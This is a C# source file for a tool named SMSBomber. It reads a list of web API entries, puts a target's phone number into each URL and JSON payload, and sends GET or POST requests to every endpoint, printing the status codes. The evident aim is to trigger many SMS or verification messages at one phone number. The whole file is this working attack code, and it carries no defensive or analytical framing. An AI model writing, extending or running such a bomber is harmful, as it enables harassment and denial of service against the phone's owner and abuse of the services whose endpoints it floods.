using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace SMSBomb
{
    public class SMSBomber
    {
        private readonly List<ApiItem> ApiItems;
        private readonly HttpClient client = new();

        public SMSBomber(List<ApiItem> apiItems)
        {
            ApiItems = apiItems;
        }
        public async Task SendRequests(string phoneNumber)
        {
            Print("Status", "Method", "Title", "PhoneNumber");

            foreach (var item in ApiItems)
            {
                switch (item.Method.ToLower().Trim())
                {
                    case "post":
                        await Post(item);
                        break;
                    default:
                        await Get(item);
                        break;
                }
            }

            async Task Get(ApiItem item)
            {
                try
                {
                    var url = item.Url?.Replace(item.PhoneNumberParameter, phoneNumber);
                    using (var response = await client.GetAsync(url))
                    {
                        Print(((int)response.StatusCode).ToString(), item.Method, item.Title, phoneNumber);
                    }
                }
                catch (Exception)
                {
                    Print("Error", item.Method, item.Title, phoneNumber);
                }
            }
            async Task Post(ApiItem item)
            {
                try
                {
                    var url = item.Url?.Replace(item.PhoneNumberParameter, phoneNumber);
                    var payload = item.Payload?.Replace(item.PhoneNumberParameter, phoneNumber);
                    var content = new StringContent(payload, Encoding.UTF8, "application/json");
                    using (var response = await client.PostAsync(url, content))
                    {
                        Print(((int)response.StatusCode).ToString(), item.Method, item.Title, phoneNumber);
                    }
                }
                catch (Exception)
                {
                    Print("Error", item.Method, item.Title, phoneNumber);
                }
            }
            void Print(string status, string method, string title, string phoneNumber)
            {
                Console.WriteLine(
                    status.PadRight(nameof(status).Length + 2) +
                    method.PadRight(nameof(method).Length + 2) +
                    phoneNumber.PadRight(nameof(phoneNumber).Length + 2) +
                    title);
            }
        }
    }
}